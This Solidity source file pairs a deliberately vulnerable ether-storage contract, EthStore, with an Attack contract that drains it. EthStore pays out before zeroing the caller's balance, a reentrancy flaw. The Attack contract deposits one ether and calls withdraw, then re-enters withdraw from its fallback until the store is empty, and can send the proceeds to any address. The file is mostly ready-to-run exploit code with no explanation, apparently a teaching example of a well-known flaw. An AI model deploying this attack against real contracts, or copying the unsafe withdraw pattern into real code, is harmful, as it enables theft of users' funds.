// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract EthStore{
    mapping(address => uint) public userBalance;

    function deposit()public payable{
        userBalance[msg.sender] += msg.value;
    }

    function withdraw()public{
        uint256 bal = userBalance[msg.sender];
        require(bal>0);
        (bool success,)= msg.sender.call{value:bal}("");
        require(success,"failed to send");
        userBalance[msg.sender]=0;
    }
}

contract Attack{
    EthStore public ethstore;
    uint256 public  constant AMOUNT= 1 ether;
    constructor(address _ethstore){
        ethstore = EthStore(_ethstore);
    }

    fallback() external payable { 
        if (address(ethstore).balance >= AMOUNT){           
            ethstore.withdraw();
        }

    }

    function attack()external  payable {
        require(msg.value >= AMOUNT);
        ethstore.deposit{value:AMOUNT}();
        ethstore.withdraw();
    }

    function getBalance()public view returns(uint256){
        return address(this).balance;
    }

    function withDraw(address payable  myaddress)public  {
        myaddress.transfer(address(this).balance);
    }


}